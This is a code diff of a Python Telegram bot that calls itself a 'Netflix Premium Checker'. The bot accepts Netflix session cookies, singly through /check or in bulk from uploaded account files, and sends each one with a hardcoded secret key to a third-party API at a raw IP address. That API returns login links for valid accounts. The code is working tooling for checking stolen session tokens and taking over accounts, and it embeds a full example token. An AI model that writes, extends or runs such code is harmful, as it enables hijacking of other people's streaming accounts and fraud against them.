@@ -18,7 +18,7 @@ load_dotenv(dotenv_path=env_path)
 
 # ==================== YOUR API CONFIGURATION ====================
 TOKEN = os.getenv('BOT_TOKEN')
-API_URL = "http://104.223.121.139:6969/api/gen"  # YOUR API
+API_URL = "http://104.223.121.139:6969/api/gen"  # YOUR API (FIXED - no extra /api/gen)
 SECRET_KEY = "IpYDCxU9VAxqi88ByaVscqTNDJPg7Cg5"  # YOUR SECRET KEY
 
 # YOUR CREDIT
@@ -69,14 +69,14 @@ LANGUAGES = {
         'payment_method': 'Payment Method',
         'next_billing': 'Next Billing',
         'extra_member': 'Extra Member',
-        'check_command': 'Check Single Cookie',
-        'enter_cookie': 'Please enter a Netflix cookie to check',
-        'checking': 'CHECKING COOKIE',
-        'cookie_valid': 'COOKIE VALID',
-        'cookie_invalid': 'COOKIE INVALID',
+        'check_command': 'Check Single Netflix ID',
+        'enter_cookie': 'Please enter a Netflix ID to check',
+        'checking': 'CHECKING NETFLIX ID',
+        'cookie_valid': 'VALID NETFLIX ID',
+        'cookie_invalid': 'INVALID NETFLIX ID',
         'extracted_id': 'Extracted Netflix ID',
         'how_to_use_check': 'HOW TO USE /check',
-        'cookie_example': 'Cookie Example',
+        'cookie_example': 'Example',
     },
     'zh': {
         'name': '中文',
@@ -116,14 +116,14 @@ LANGUAGES = {
         'payment_method': '支付方式',
         'next_billing': '下次计费',
         'extra_member': '额外成员',
-        'check_command': '检查单个Cookie',
-        'enter_cookie': '请输入要检查的Netflix cookie',
-        'checking': '正在检查COOKIE',
-        'cookie_valid': 'COOKIE有效',
-        'cookie_invalid': 'COOKIE无效',
+        'check_command': '检查单个Netflix ID',
+        'enter_cookie': '请输入要检查的Netflix ID',
+        'checking': '正在检查NETFLIX ID',
+        'cookie_valid': 'NETFLIX ID有效',
+        'cookie_invalid': 'NETFLIX ID无效',
         'extracted_id': '提取的Netflix ID',
         'how_to_use_check': '如何使用 /check',
-        'cookie_example': 'Cookie示例',
+        'cookie_example': '示例',
     },
     'km': {
         'name': 'ខ្មែរ',
@@ -163,14 +163,14 @@ LANGUAGES = {
         'payment_method': 'វិធីបង់ប្រាក់',
         'next_billing': 'វិក្កយបត្របន្ទាប់',
         'extra_member': 'សមាជិកបន្ថែម',
-        'check_command': 'ពិនិត្យ Cookie តែមួយ',
-        'enter_cookie': 'សូមបញ្ចូល Netflix cookie ដើម្បីពិនិត្យ',
-        'checking': 'កំពុងពិនិត្យ COOKIE',
-        'cookie_valid': 'COOKIE ត្រឹមត្រូវ',
-        'cookie_invalid': 'COOKIE មិនត្រឹមត្រូវ',
+        'check_command': 'ពិនិត្យ Netflix ID តែមួយ',
+        'enter_cookie': 'សូមបញ្ចូល Netflix ID ដើម្បីពិនិត្យ',
+        'checking': 'កំពុងពិនិត្យ NETFLIX ID',
+        'cookie_valid': 'NETFLIX ID ត្រឹមត្រូវ',
+        'cookie_invalid': 'NETFLIX ID មិនត្រឹមត្រូវ',
         'extracted_id': 'Netflix ID ដែលបានទាញយក',
         'how_to_use_check': 'របៀបប្រើ /check',
-        'cookie_example': 'ឧទាហរណ៍ Cookie',
+        'cookie_example': 'ឧទាហរណ៍',
     }
 }
 
@@ -233,18 +233,10 @@ def extract_netflix_id_from_cookie(cookie_text):
         match = re.search(pattern, cookie_text, re.IGNORECASE)
         if match:
             netflix_id = match.group(1).strip()
-            # URL decode if needed
-            try:
-                netflix_id = urllib.parse.unquote(netflix_id)
-            except:
-                pass
             return netflix_id
     
-    # If no pattern matches, maybe the whole text is the NetflixId?
-    if len(cookie_text) > 50 and '=' not in cookie_text and '&' not in cookie_text:
-        return cookie_text
-    
-    return None
+    # If no pattern matches, return the whole text (might be just the ID)
+    return cookie_text
 
 # ==================== ENHANCED FORMAT PARSER ====================
 
@@ -378,21 +370,21 @@ def parse_account_line(line):
         logger.debug(f"Problem line: {line[:200]}...")
         return None
 
-# ==================== YOUR API FUNCTIONS ====================
+# ==================== YOUR API FUNCTIONS (FIXED) ====================
 
 async def check_with_your_api(netflix_id, email="unknown@email.com"):
-    """Check Netflix ID using YOUR API - with proper error handling"""
+    """Check Netflix ID using YOUR API - EXACTLY as per documentation"""
     
     if not netflix_id:
         return {
             "success": False,
             "error": "No Netflix ID provided",
-            "error_code": "MISSING_ID",
+            "error_code": "MISSING_NETFLIX_ID",
             "email": email
         }
     
     try:
-        # YOUR API endpoint - exactly as specified
+        # API endpoint - exactly as specified in documentation
         url = "http://104.223.121.139:6969/api/gen"
         
         # Data payload exactly as your API expects
@@ -401,17 +393,17 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
             "secret_key": SECRET_KEY
         }
         
-        logger.info(f"📡 Calling YOUR API for {email}")
-        logger.info(f"🔑 Netflix ID: {netflix_id[:30]}...")
+        logger.info(f"📡 Calling API for {email}")
+        logger.info(f"🔑 Netflix ID: {netflix_id[:50]}...")
         
-        # Make the POST request as specified in your instructions
+        # Make the POST request exactly as in the example
         response = requests.post(url, json=data, timeout=15)
         result = response.json()
         
         logger.info(f"📥 API Response: {result}")
         
-        # Check if API call was successful according to YOUR API's format
-        if result.get('success') == True:
+        # Check if API call was successful (exactly as in the example)
+        if result.get('success'):
             login_url = result.get('login_url')
             if login_url:
                 logger.info(f"✅ VALID ACCOUNT: {email}")
@@ -429,30 +421,16 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
                     "email": email
                 }
         else:
-            # Handle error responses from YOUR API
-            error_code = result.get('error_code', 'UNKNOWN_ERROR')
+            # Get error message (exactly as in the example: r.get('error'))
             error_msg = result.get('error', 'Unknown error')
+            error_code = result.get('error_code', 'UNKNOWN_ERROR')
             
-            # Map error codes to user-friendly messages
-            error_messages = {
-                'INVALID_RESPONSE_FORMAT': "Netflix ID is invalid or expired",
-                'INVALID_NETFLIX_ID': "Netflix ID is invalid or expired",
-                'SERVER_ERROR': "Netflix server error - try again later",
-                'MISSING_NETFLIX_ID': "No Netflix ID provided",
-                'INVALID_SECRET_KEY': "API configuration error - contact admin",
-                'AUTH_URL_EXTRACTION_FAILED': "Could not generate login link",
-                'MAINTENANCE_MODE': "API is under maintenance - try again later"
-            }
-            
-            user_message = error_messages.get(error_code, f"Error: {error_msg}")
-            
-            logger.warning(f"❌ INVALID ACCOUNT: {email} - {user_message}")
+            logger.warning(f"❌ INVALID ACCOUNT: {email} - {error_msg}")
             
             return {
                 "success": False,
-                "error": user_message,
+                "error": error_msg,
                 "error_code": error_code,
-                "raw_error": error_msg,
                 "email": email
             }
                 
@@ -558,7 +536,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ✅ Real-time progress tracking
 ✅ Detailed statistics
 ✅ Supports multiple formats
-✅ **NEW: /check command for single cookie validation**
+✅ **NEW: /check command for single Netflix ID validation**
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 **Commands:**
@@ -591,22 +569,28 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 1️⃣ **Upload .txt file** with multiple accounts
-2️⃣ **OR use /check command** for single cookie
+2️⃣ **OR use /check command** for single Netflix ID
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔍 **{lang['how_to_use_check']}:**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-`/check NetflixId=v%3D3%26ct%3D...`
+`/check YOUR_NETFLIX_ID`
 
 {lang['cookie_example']}:
-`/check NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7As1J8J9LYv4vKLR4npPUavCpTp4WRErFit1m4Lziy5TudFyhWf2b5h9K0wskC86QohevyPBrJFrbfH72JwMNmKN0whelCd1cmWpZT0rJ29MHMwFZDySfF5TKCLAnGObhzofhleX2I7i3p2kVhBNRWBNABUIuPNZVhhGqozDjBknkZkXwZO4wiTfORPdBzdEGq5V3NZZnYTturjPlopfMw_mRbOJrP6Ps4DQfYNCfjtIH77AyySXT5wbO6qnNZqcVYG0XiSEPG02Q8IWY6TLX1zBINS5pI6-n3lKFV-hyuKzA4ftNmzpwdo1GZTSkgAu6q-FKoQOIAxkThlhCKbzyCoQlcmE-bsxtNxQ7UCahly9M8-lN6D4TbFL0GwNo4BlyMX_b4P-3uA9oCIyV-acyKE4945VbqTPHpLVKLzfUNa4e5-GEdvl9UXoxCMdZCOYItzCtsB2myXehcI0gbIYqe2qkYQfqWKPFgZPcxoGzcESuh9kKavt1zfc-5hMYBiIOCgxH-brBzf5oNb--YHo.%26pg%3DCHWFRMA5FJFGRF4M2RTU2U3CJI%26ch%3DAQEAEAABABSpV7B-qaZtKu4KOMgwROjK_chiZCTB4wU.`
+`/check v%3D3%26ct%3DBgjHlOvcAxL7...`
+
+✅ **You can use either:**
+• Full cookie: `NetflixId=v%3D3%26ct%3D...`
+• Just the value: `v%3D3%26ct%3D...`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **Error Messages / 错误信息 / សារកំហុស:**
+📊 **Error Codes / 错误代码 / លេខកូដកំហុស:**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• `INVALID_RESPONSE_FORMAT` - Cookie expired/invalid
-• `SERVER_ERROR` - Netflix server issue
-• `TIMEOUT` - Request timeout
+• `MISSING_NETFLIX_ID` - No Netflix ID provided
+• `INVALID_NETFLIX_ID` - Netflix ID is invalid or expired
+• `MISSING_SECRET_KEY` - API configuration error
+• `INVALID_SECRET_KEY` - Invalid API credentials
+• `MAINTENANCE_MODE` - System under maintenance
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
@@ -662,10 +646,10 @@ async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ==================== NEW CHECK COMMAND ====================
+# ==================== CHECK COMMAND (FIXED) ====================
 
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check a single Netflix cookie manually"""
+    """Check a single Netflix ID manually"""
     user_id = update.effective_user.id
     lang_code = get_lang(user_id)
     lang = LANGUAGES[lang_code]
@@ -680,19 +664,20 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # Get the cookie from the command arguments
+    # Get the Netflix ID from the command arguments
     if not context.args:
         await update.message.reply_text(
             f"""
 ╔══════════════════════════════════════════╗
-║     ❌ **MISSING COOKIE** ❌     ║
+║     ❌ **MISSING NETFLIX ID** ❌     ║
 ╚══════════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{lang['enter_cookie']}
+📝 **Usage:** `/check YOUR_NETFLIX_ID`
 
-📝 **{lang['cookie_example']}:**
-`/check NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7...`
+✅ **Examples:**
+• `/check v%3D3%26ct%3DBgjHlOvcAxL7...`
+• `/check NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7...`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
@@ -702,8 +687,23 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # Join all arguments to get the full cookie
-    cookie_text = ' '.join(context.args)
+    # Join all arguments to get the full input
+    user_input = ' '.join(context.args)
+    
+    # Clean up the input - extract just the Netflix ID value
+    if 'NetflixId=' in user_input or 'netflixid=' in user_input:
+        # Extract using regex to get the value after NetflixId=
+        match = re.search(r'NetflixId=([^\s]+)', user_input, re.IGNORECASE)
+        if match:
+            netflix_id = match.group(1)
+        else:
+            netflix_id = user_input
+    else:
+        # Assume the whole thing is the Netflix ID
+        netflix_id = user_input
+    
+    # Remove any quotes if present
+    netflix_id = netflix_id.strip('"\'')
     
     # Send checking message
     checking_msg = await update.message.reply_text(
@@ -713,7 +713,8 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ╚══════════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏳ **Status:** Validating cookie...
+⏳ **Status:** Validating...
+🔑 **Netflix ID:** `{netflix_id[:50]}...`
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
@@ -721,32 +722,8 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
     
-    # Extract Netflix ID from the cookie
-    netflix_id = extract_netflix_id_from_cookie(cookie_text)
-    
-    if not netflix_id:
-        await checking_msg.edit_text(
-            f"""
-╔══════════════════════════════════════════╗
-║     ❌ **{lang['cookie_invalid']}** ❌     ║
-╚══════════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❌ **Error:** Could not extract Netflix ID from the provided text
-
-📝 **{lang['cookie_example']}:**
-`NetflixId=v%3D3%26ct%3DBgjHlOvcAxL7...`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-            """,
-            parse_mode='Markdown'
-        )
-        return
-    
-    # Check with API
-    result = await check_with_your_api(netflix_id, f"manual_check_{netflix_id[:8]}")
+    # Check with API using the exact format from the documentation
+    result = await check_with_your_api(netflix_id, f"manual_{netflix_id[:8]}")
     
     total_checks += 1
     
@@ -760,7 +737,7 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ╚══════════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 **{lang['extracted_id']}:**
+🔑 **Netflix ID:**
 `{netflix_id[:50]}...`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -787,14 +764,14 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ╚══════════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 **{lang['extracted_id']}:**
+🔑 **Netflix ID:**
 `{netflix_id[:50]}...`
 
 ❌ **Error:** {result.get('error', 'Unknown error')}
 📋 **Error Code:** `{result.get('error_code', 'UNKNOWN')}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 **Note:** The cookie may be expired or invalid
+💡 **Note:** The Netflix ID may be expired or invalid
 
 ⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1013,8 +990,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             summary += f"""
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 **Note:** 'INVALID_RESPONSE_FORMAT' means
-    the Netflix cookie has expired.
+💡 **Note:** 'INVALID_NETFLIX_ID' means
+    the Netflix ID has expired.
 
 ⚡ **{lang['powered_by']} {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1059,12 +1036,12 @@ async def run_bot():
     print("🎬 NETFLIX PREMIUM CHECKER BOT")
     print("=" * 60)
     print(f"✅ Bot Token: {TOKEN[:10]}...")
-    print(f"✅ YOUR API: {API_URL}")
+    print(f"✅ API URL: http://104.223.121.139:6969/api/gen")
     print(f"✅ Credit: {YOUR_CREDIT}")
     print("=" * 60)
     print("🌐 Languages: English, 中文, ខ្មែរ")
     print("📁 Supports multiple formats")
-    print("🔍 New: /check command for single cookies")
+    print("🔍 /check command for single Netflix ID")
     print("🎨 Beautiful Premium Output")
     print("=" * 60)
     
@@ -1076,7 +1053,7 @@ async def run_bot():
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("clear", clear_command))
     app.add_handler(CommandHandler("language", language_command))
-    app.add_handler(CommandHandler("check", check_command))  # NEW COMMAND
+    app.add_handler(CommandHandler("check", check_command))
     app.add_handler(CallbackQueryHandler(language_callback, pattern="^lang_"))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
     
